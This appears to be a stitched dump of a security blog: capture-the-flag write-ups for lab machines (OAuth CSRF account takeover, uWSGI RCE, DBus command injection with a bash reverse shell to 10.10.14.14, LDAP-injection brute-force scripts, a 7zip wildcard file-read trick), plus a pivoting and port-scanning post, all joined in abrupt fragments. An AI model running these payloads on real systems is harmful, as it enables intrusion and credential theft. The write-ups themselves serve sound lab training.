It is sent by the consumer to the Oauth server through the user\u0026rsquo;s browser. In our case, it corresponds to this request:\nAuthorization Request In this request, the consumer also sends his client_id in order to authenticate to the Oauth server, the response_type parameter indicating the grant type, redirect_uri which is the page that the user will be redirected to after consenting, finally scope indicating operations to be done with the accessed data (\u0026lsquo;read\u0026rsquo; in this case).\nUser Login \u0026amp; Consent: After the first request is sent, the user is sent to the OAuth provider page so that they can login and consent to authorize the client application to access their data.\nAuthorization Code Grant: Once the user consents, they are redirected to the URL that was provided through the redirect_uri parameter along with the authorization code. This authorization code is linked to the user account on the OAuth server/provider website.\nAccess Token Request: Using the previous authorization code, the client application will contact directly the Oauth server (without going through the user\u0026rsquo;s browser) asking for a token.\nAccess Token Grant: After doing some verifications, the OAuth server will send the token to the client application, allowing it to access user data.\nAPI Call: The client application makes an API call to retrieve user data\nUser Data: The OAuth server checks the token and sends the data.\nUnderstanding Oouch\u0026rsquo;s OAuth Flow # Going back a little bit, we notice that when we tried to connect another account to our existing account on consumer.oouch.htb:5000 through the /oauth/connect endpoint, it triggered the OAuth flow by redirecting us to the OAuth server on authorization.oouch.htb:8000/oauth/authorize along with the following parameters:\nclient_id response_type redirect_uri scope This represent the first step, or the \u0026ldquo;Authorization request\u0026rdquo;, referring to the previous diagram.\nAfter that we\u0026rsquo;re then redirected once again to the login page of the OAuth server at authorization.oouch.htb:8000/login/ where the application expects us to login and consent (this is step 2).\nHowever, right now we don\u0026rsquo;t have an account on the OAuth server website. So we\u0026rsquo;ll need to find a way to create one there.\nIf we go to authorization.oouch.htb:8000/, we see the following:\nauthorization.oouch.htb:8000/ We see in the notice that we can provide SSH credentials. This might be interesting, but for now let\u0026rsquo;s just create an account by going to /signup\nauthorization.oouch.htb:8000/signup After creating the account and logging in, we are sent to /home:\nauthorization.oouch.htb:8000/home In this page we\u0026rsquo;re shown the relevant endpoints that are involved in the OAuth process:\n/oauth/authorize: which is the endpoint where the Authorization request is sent (step 1). /oauth/token: which we don\u0026rsquo;t know the use of yet. Now that we have an account on the OAuth server (Oouch), let\u0026rsquo;s connect this account to the account that we have on consumer.oouch.htb:5000 by once again going to consumer.oouch.htb:5000/oauth/connect.\nThis time, since we\u0026rsquo;re already logged in on the OAuth server, we are directly asked to consent:\nAuthorization Prompt in Burp Once we click on Authorize, we\u0026rsquo;re redirected to our user profile at consumer.oouch.htb:5000/profile, and we see that our account on Oouch (the OAuth server) is now linked:\nOouch account linked! When we clicked on Authorize, the following POST request was sent:\nConsent POST Request which lead to a redirect to: consumer.oouch.htb:5000/oauth/connect/token?code=\u0026lt;AUTH_CODE\u0026gt;.\nWhen we hit that endpoint, it will check if the authorization code (code parameter) is valid. If so, the account linked to the authorization code (in this case the account we created on the OAuth server: squ4r00t_oouch) will be linked to the consumer web application.\nWe also notice something interesting: the state parameter is empty. The absence of this parameter potentially means that an attacker can initiate an OAuth flow themselves before tricking a user\u0026rsquo;s browser into completing it, similar to a traditional CSRF attack.\nOAuth Exploitation: Part 1 # We\u0026rsquo;ll initiate the OAuth process normally until we arrive at the moment we\u0026rsquo;re redirected to consumer.oouch.htb:5000/oauth/connect/token?code=\u0026lt;AUTH_CODE\u0026gt; at which point (without following the redirect!) we\u0026rsquo;ll try to make the administrator access that link. This will tie our account (the one on the OAuth server: squ4r00t_oouch) to the administrator\u0026rsquo;s account (the one on the consumer: port 5000).\nWe\u0026rsquo;ll send the following payload in the contact form:\n\u0026lt;a href=\u0026#34;http://consumer.oouch.htb:5000/oauth/connect/token?code=a1b2.....xyz\u0026#34;\u0026gt;click here!\u0026lt;/a\u0026gt; Make sure to replace the authorization code with a valid one tied to your account on the Authorization server. CSRF link sent to admin After a few second, we see that our Oouch account not linked anymore:\nNo Accounts Connected. Let\u0026rsquo;s try to logout, and login with our Oouch account at consumer.oouch.htb:5000/oauth/login:\nLogged in as qtc. We can see that our Oouch account was linked to qtc\u0026rsquo;s account.\nNow if we go to /documents, we see something different:\nqtc\u0026rsquo;s documents. From this we learn:\nWe have developer credentials we can use for \u0026ldquo;application registration\u0026rdquo; develop:supermegasecureklarabubu123! /api/get_user to get user data (returns a 403) /oauth/authorize supports GET method There is an ssh key to be found somewhere OAuth Exploitation: Part 2 # Let\u0026rsquo;s try to find others endpoints under /oauth/\nffuf -u \u0026#39;http://authorization.oouch.htb:8000/oauth/FUZZ\u0026#39; -w /usr/share/wordlists/dirb/common.txt /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://authorization.oouch.htb:8000/oauth/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ applications [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 50ms] Going to /oauth/applications presents us with a login prompt and trying the credentials we found in qtc\u0026rsquo;s documents doesn\u0026rsquo;t work.\nHTTP Basic Auth After some more enumeration, we find the /oauth/applications/register endpoint where the credentials worked.\nWe are then directed to the application registration page:\nApplication Registration Page Client id and client secret are provided by the application. Clicking on save will register our new application to the OAuth server:\nApplication Created! Now that our application is created, we use it with the CSRF in the contact form in order to trick the user to authorize our application. Once they do, we\u0026rsquo;ll receive the authorization code (tied to their account) which we can then use to request an access token that will allow us to authenticate as them.\nDon\u0026rsquo;t forget to setup a listener on the return URL to catch the authorization token We can use the following payload:\n\u0026lt;a href=\u0026#34;http://authorization.oouch.htb:8000/oauth/authorize/?client_id=dQ8riRsCow9njRJOLr35uzUg0imhn9SAq8o3bawX\u0026amp;response_type=code\u0026amp;redirect_uri=http://10.10.14.14/pwned\u0026amp;scope=read\u0026amp;allow=Authorize\u0026#34;\u0026gt;click!\u0026lt;/a\u0026gt; Notice \u0026amp;allow=Authorize (originally in the request POST body) was added to the URL parameters since this endpoint is said to allow the GET method.\nAfter a few seconds, we get the authorization code on our netcat listener:\nAuthorization Code! Now we can request a token on the /oauth/token endpoint we found earlier:\nGot the Bearer token! Using this token, we can for example, access /api/get_user:\nInformation about qtc After more enumeration for other api endpoints, we find /api/get_sshkey:\nqtc\u0026rsquo;s ssh key Using the ssh key, we can login as qtc and retrieve the user flag:\nUser flag obtained ! Privesc # qtc -\u0026gt; www-data # In the home directory we find a note:\nNote in home directory This talks about an Intrusion Prevention System being implemented using DBus an iptables. This might be what was blocking us earlier when we tried XSS in the contact form.\nSince the note mentionned DBUS, let\u0026rsquo;s look at the configuration files of the different registered services. Going under /etc/dbus-1/system.d/, we find the following:\nhtb.oouch.Block\u0026rsquo;s config file This is the configuration file of the service named: htb.oouch.Block. Let\u0026rsquo;s look at its content:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!-- -*- XML -*- --\u0026gt; \u0026lt;!DOCTYPE busconfig PUBLIC \u0026#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\u0026#34; \u0026#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\u0026#34;\u0026gt; \u0026lt;busconfig\u0026gt; \u0026lt;policy user=\u0026#34;root\u0026#34;\u0026gt; \u0026lt;allow own=\u0026#34;htb.oouch.Block\u0026#34;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;policy user=\u0026#34;www-data\u0026#34;\u0026gt; \u0026lt;allow send_destination=\u0026#34;htb.oouch.Block\u0026#34;/\u0026gt; \u0026lt;allow receive_sender=\u0026#34;htb.oouch.Block\u0026#34;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;/busconfig\u0026gt; This tells us that the root user owns this service (running as root) and also that www-data is allowed to send and receive messages to and from this service.\nWhen we try to look for the website\u0026rsquo;s root directory we cannot find it on the host, /var/www doesn\u0026rsquo;t exist.\nLooking at the different network interfaces, we see that there might docker containers running on the host:\nDocker subnets We can use this bash oneliner to do a ping sweep on the different subnets:\nSince docker assigns IPs from the beginning, we can just ping the first 10\nfor i in {1..10};do ping -c 1 -W 1 172.18.0.$i \u0026gt;/dev/null \u0026amp;\u0026amp; echo \u0026#34;172.18.0.$i: up\u0026#34;; done Ping sweep results We see that 2,3,4 and 5 are up. Let\u0026rsquo;s see which one is running the website on :5000. For that we can use this command:\nfor i in {2..5}; do echo \u0026#34;test\u0026#34; \u0026gt; /dev/tcp/172.18.0.$i/5000 \u0026amp;\u0026amp; echo \u0026#34;172.18.0.$i:5000 open\u0026#34;; done :5000 port scan results We see that port 5000 is opened on 172.18.0.4, which means it\u0026rsquo;s probably the container that is running the consumer website. We also notice that port 22 is also opened:\nPort 22 also opened We can directly ssh into the container with our user qtc:\nSSH access in docker container Looking around the filesystem, we see a /code directory:\n/code directory In /code/oouch/routes.py, this part catches our attention:\n# First apply our primitive xss filter if primitive_xss.search(form.textfield.data): bus = dbus.SystemBus() block_object = bus.get_object(\u0026#39;htb.oouch.Block\u0026#39;, \u0026#39;/htb/oouch/Block\u0026#39;) block_iface = dbus.Interface(block_object, dbus_interface=\u0026#39;htb.oouch.Block\u0026#39;) client_ip = request.environ.get(\u0026#39;REMOTE_ADDR\u0026#39;, request.remote_addr) response = block_iface.Block(client_ip) bus.close() return render_template(\u0026#39;hacker.html\u0026#39;, title=\u0026#39;Hacker\u0026#39;) This code snippet checks if the content of the text field (the one in the contact page) contains an XSS. If so, it will call the method Block() from the htb.oouch.Block interface by passing it the client IP address as a parameter. Depending on how the client_ip is handle, this could lead to an injection somewhere.\nHowever we cannot test for it now since we\u0026rsquo;re the user qtc and we need to be www-data in order to interact with that service and call the Block() method.\nLooking further in the /code directory, we see the uwsgi.ini file suggesting that the applicaiton is using uWSGI which serves as an interface between web servers (like Nginx, Apache) and Python web applications/frameworks (like Django, Flask).\nSearching for uwsgi exploits, we find this one which is an RCE. This will likely get us a shell as www-data.\nYou will need to remove \u0026ldquo;import bytes\u0026rdquo; on line 18 RCE as www-data Using this we can get a reverse shell as www-data:\nReverse shell as www-data Now that we have a shell as www-data, we can use the following python script to see if there is a command injection vulnerability:\nimport sys sys.path.insert(0, \u0026#34;/usr/lib/python3/dist-packages\u0026#34;) import dbus bus = dbus.SystemBus() block_object = bus.get_object(\u0026#39;htb.oouch.Block\u0026#39;, \u0026#39;/htb/oouch/Block\u0026#39;) block_iface = dbus.Interface(block_object, dbus_interface=\u0026#39;htb.oouch.Block\u0026#39;) client_ip = \u0026#39;; bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.14/1338 0\u0026gt;\u0026amp;1\u0026#34; //\u0026#39; response = block_iface.Block(client_ip) bus.close() The first two lines were added to tell the script where to find the dbus package\nIf we run it without, we\u0026rsquo;ll get the following error:\ndbus import error After running it, we get a shell as root and can retrieve the root flag:\nRoot flag obtained !

If we don\u0026rsquo;t, we move on to the letter \u0026lsquo;b\u0026rsquo; by sending b*, so on and so forth. Let\u0026rsquo;s say that we confirmed that the first letter is \u0026lsquo;a\u0026rsquo;. Now we repeat the process for the second letter by sending aa* We repeat this process until we get the full username. For this, we can use this python script:\nimport requests import string import time letters = list(string.ascii_lowercase) url = \u0026#39;http://10.10.10.122/login.php\u0026#39; def guess_next_char(current_guessed_string): for letter in letters: time.sleep(0.3) data = { \u0026#34;inputUsername\u0026#34;: f\u0026#34;{current_guessed_string}{letter}%2a\u0026#34;, \u0026#34;inputOTP\u0026#34;: \u0026#34;1234\u0026#34;, } response = requests.post(url, data=data) if \u0026#34;Cannot login\u0026#34; in response.text: return letter print(\u0026#34;END\u0026#34;) exit(1) username = \u0026#34;\u0026#34; while True: username += guess_next_char(username) print(username) Script running The script returned the username ldapuser. We can confirm it by trying it on the login page:\nConfirmation Now that we have a valid username, we need to know the OTP.\nReferring to the comment we found earlier, the token is stored in one of the attribute. However we don\u0026rsquo;t know which one that is. We can use the LDAP injection in order to fuzz for different attributes and see which one contains the token.\nAttribute enumeration # We can use this LDAP attributes wordlist from PayloadsAllTheThings:\nc cn co commonName dc facsimileTelephoneNumber givenName gn homePhone id jpegPhoto l mail mobile name o objectClass ou owner pager password sn st surname uid username userPassword Assuming that the LDAP logic in the backend looks like the following:\n(\u0026amp; (username=\u0026lt;USERINPUT\u0026gt;) (otp=\u0026lt;USERINPUT\u0026gt;) ) We can try to breakout of one of the conditions and add our own which will contain the attribute we are testing the existence of.\nThis can be done by sending something like ldapuser)(attribute=* as the username (double URL-encoded).\nThis will then result in the following \u0026ldquo;hypothetical\u0026rdquo; query:\n(\u0026amp; (username=ldapuser) (attribute=*) (otp=\u0026lt;USERINPUT\u0026gt;) ) If the attribute doesn\u0026rsquo;t exist we won\u0026rsquo;t get the \u0026ldquo;Cannot login\u0026rdquo; error message.\nUsing burp intruder, we can fuzz every attribute in our wordlist and see for which ones we get \u0026ldquo;Cannot login\u0026rdquo; in the response\nSetting up Burp Intruder Valid LDAP attributes Among this list of valid attributes, pager seems to be a good candidate for containing a 81 digits token. We can verify it by using the same method as we did in the username enumeration.\nToken leak # We can use a slightly modified version of the previous script:\nimport requests import string import time letters = list(string.ascii_lowercase) digits = [int(d) for d in \u0026#34;1234567890\u0026#34;] url = \u0026#39;http://10.10.10.122/login.php\u0026#39; def guess_next_char(current_guessed_string): for digit in digits: time.sleep(0.3) data = { \u0026#34;inputUsername\u0026#34;: f\u0026#34;ldapuser%29%28pager%3d{current_guessed_string}{digit}%2a\u0026#34;, \u0026#34;inputOTP\u0026#34;: \u0026#34;1234\u0026#34;, } response = requests.post(url, data=data) if \u0026#34;Cannot login\u0026#34; in response.text: return str(digit) print(\u0026#34;END\u0026#34;) exit(1) token = \u0026#34;\u0026#34; while True: token += guess_next_char(token) print(token) Start of the attack Brute Force finished OTP Generation # From the token we obtained previously, we need to generate a valid OTP which we can use to login. For this we can use the command line tool: stoken (It was mentionned on the home page that the authentication was based on Software Tokens)\nBefore running the tool, we need to make sure that our clock is synchronized with the server\u0026rsquo;s or use a time offset\nstoken --token=285449490011372370317401734215712056720371131272577450204172154164546722716756524 --pin=0000 After submitting the login request with the generated OTP, we are redirected to the following page /page.php:\n/page.php Command execution # If we try to run a command, we receive this error message:\nCannot run commands This is means that there is a group membership check that is done. So in order to execute commands we\u0026rsquo;ll either have to get access to a more privileged account or somehow bypass the group membership check.\nWe can try to do the latter by injecting a NULL byte (0x00) character after closing the ldap query.\nFor that we\u0026rsquo;ll first send ldapuser)%00 as the username and increase the number of parenthesis until we close the query.\nWith 1 parenthesis With 2 parenthesis With 3 parenthesis So we need 3 parenthesis to close the query. Now, we can try to login with ldapuser)))%00 and a valid OTP and see if we bypass the group membership check.\nLogin with null byte injection We logged in successfully with the null byte injection.\nRunning the \u0026lsquo;id\u0026rsquo; command Now we are able to run commands, we can therefore get a reverse shell:\nExecuting the reverse shell Catching the reverse shell Privesc # apache -\u0026gt; ldapuser # Looking at the files of the website, we find credentials for ldapuser in /var/www/html/login.php:\nWe can use them to login as ldapuser via ssh and retrieve the user flag:\nldapuser -\u0026gt; root # Under /backup, we can see different archives with timestamps in their name. Looking at the last modified date, we see they are each separated by a minute.\nThis indicates that there might be a cron job running every minute.\nWe also have a error.log file running every minute which is empty. And a bash script called honeypot.sh:\n# get banned ips from fail2ban jails and update banned.txt # banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds) /usr/sbin/ipset list | grep fail2ban -A 7 | grep -E \u0026#39;[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\u0026#39; | sort -u \u0026gt; /var/www/html/banned.txt # awk \u0026#39;$1=$1\u0026#39; ORS=\u0026#39;\u0026lt;br\u0026gt;\u0026#39; /var/www/html/banned.txt \u0026gt; /var/www/html/testfile.tmp \u0026amp;\u0026amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt # some vars in order to be sure that backups are protected now=$(date +\u0026#34;%s\u0026#34;) filename=\u0026#34;backup.$now\u0026#34; pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk \u0026#39;{print $1}\u0026#39;) # keep only last 10 backups cd /backup ls -1t *.zip | tail -n +11 | xargs rm -f # get the files from the honeypot and backup \u0026#39;em all cd /var/www/html/uploads 7za a /backup/$filename.zip -t7z -snl -p$pass -- * # cleaup the honeypot rm -rf -- * # comment the next line to get errors for debugging truncate -s 0 /backup/error.log Essentially this script will use 7zip to backup the contents of the /var/www/html/uploads directory. However the command uses a wildcard. We can use this in order to read files we don\u0026rsquo;t have read access for.\nThat is possible because with 7zip we can provide listfiles as arguments like this:\n7z @myfile Then 7zip will get the file with the name myfile and read its content. This file should contain a list of all the files we want to archive. It could look like this:\nfile1.pdf secret.txt In the case where myfile is a symbolic link to another file, it is the content of that file that is read instead. In our our example, let\u0026rsquo;s say we have myfile pointing to /root/root.txt. 7zip will consider the content of /root/root.txt as a file to archive, but since there are no files with that name, it will cause an error which will be logged in error.log file, disclosing the content of /root/root.txt.\nNote that providing directly the symbolic link (without using listfiles) would not work in this case since the command uses the -snl argument. This will archive the link itself instead of the content of the file that is being pointing at.\n-snl argument Another problem is that the error.log file is cleaned up after each execution. But we can use the tail command to monitor it for any changes:\ntail -f error.log So in one terminal we\u0026rsquo;ll create (as the user apache) two files:\n@myfile myfile which is a link to the file we want to read, in this case /root/root.txt Creating necessary files And in the second terminal (as ldapuser), we monitor the changes on error.log.\nAfter a few seconds, we get the root flag in the second terminal:\nRoot flag obtained!

Pass this serialized object to the sator.php script through the GET parameter arepo. Then, the script will instanciate a new object with the provided data. Once the execution is done, the __destruct() method is called, and our webshell will be written.

A pivot host is a machine that is both in our network and the internal network that we want to access:\nBasic Pivoting Scenario In the image above, as the attacker (10.10.50.20) we cannot directly access Server 1 (172.16.10.3). However there is a host that we can reach, which in turn can reach Server 1. That host is the Pivot here having the IP addresses: 10.10.50.100 \u0026amp; 172.16.10.2.\nIn this situation, we can pivot into the internal network (172.16.10.0/24) by tunneling our traffic through the pivot host (also called Jump Host). That way, if we want to send a packet to Server 1, we would send it first to the Pivot, which will then relay it to Server 1.\nUsing tools like ligolo-ng or chisel we can easily do just that.\nPort Scanning through Pivots # When scanning hosts that are in an internal network from an external network, we usually have to make a compromise between speed and accuracy/stability. If we send too many requests, we will probably lose some packets which might result in missing open ports making the scan results unreliable. Furthermore, it can also break the tunnel that we constructed to access the internal network.\nScanning through a pivot (default way) In the above image, we can see 3 hosts:\nAttacker which is in an external network trying to port scan a server that is situated in the internal network Pivot relaying the packets from Attacker to the target server Server to scan which is the target server being scanned We can also see dashed arrows reprensenting the flow of packets being transfered in the different network segments.\nIn this scenario, let\u0026rsquo;s say we are probing port 80. Before we get back info whether the port is opened or closed, the information would have went through 4 segments (2 for request, 2 for response). And that\u0026rsquo;s if we\u0026rsquo;re doing a SYN scan. In this case we can see that it\u0026rsquo;s not unlikely that one of the packets might be lost, especially when our connection is not very stable (typical when pivoting).\nTo avoid all these problems we can, like mentionned in the introduction, perform the scan from the pivot machine. But without having to write on disk (for the sake of stealth).\nSPS (SimplePortScanner) # sps is a TCP port scanner written in Go to which you can specify a host (which you have ssh access to) to run the scan from (without touching disk).\nIt will connect to the specified host with the credentials provided. Upon successful authentication, it executes a command that will retrieve the compiled binary of sps hosted on a HTTP server or SMB share that you\u0026rsquo;ve set up before running sps.\nThe command that is executed and whether a HTTP server or SMB share should be setup, both depends on the OS of the host perfoming the scan. This is explained in sps\u0026rsquo; README.\nOnce the binary is retrieved it will be executed in memory and the results will be returned on STDOUT.\nPort scanning through pivot using sps On the above image, we can see that the arrows between the attacker and the pivot are not dashed anymore. This illustrates that we are not sending each single packet (for a single probe) all the way from attacker to target, rather we will send one \u0026ldquo;big request\u0026rdquo; to the pivot, which will do the work and returns us back the results.\nOn the perspective of the attacker, it\u0026rsquo;s like the scan was ran from their machine.\nThanks for reading, you can check out the tool here -\u0026gt; SPS\n","date":"9 March 2025","externalUrl":null,"permalink":"/posts/portscanning-through-pivots/portscanning-through-pivots/","section":"Posts","summary":"","title":"Port scanning through network pivots","type":"posts"},{"content":"","date":"9 March 2025","externalUrl":null,"permalink":"/tags/port_scanning/","section":"Tags","summary":"","title":"Port_scanning","type":"tags"},{"content":"","date":"9 March 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/aiohttp/","section":"Tags","summary":"","title":"AioHTTP","type":"tags"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/cif/","section":"Tags","summary":"","title":"Cif","type":"tags"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/cve-2024-23334/","section":"Tags","summary":"","title":"CVE-2024-23334","type":"tags"},{"content":"","date":"3 March 2025","externalUrl":null,"permalink":"/tags/cve-2024-23346/","section":"Tags","summary":"","title":"CVE-2024-23346","type":"tags"},{"content":" Chemistry is an easy-difficulty Linux machine that showcases a Remote Code Execution (RCE) vulnerability in the pymatgen (CVE-2024-23346) Python library by uploading a malicious CIF file to the hosted CIF Analyzer website on the target.
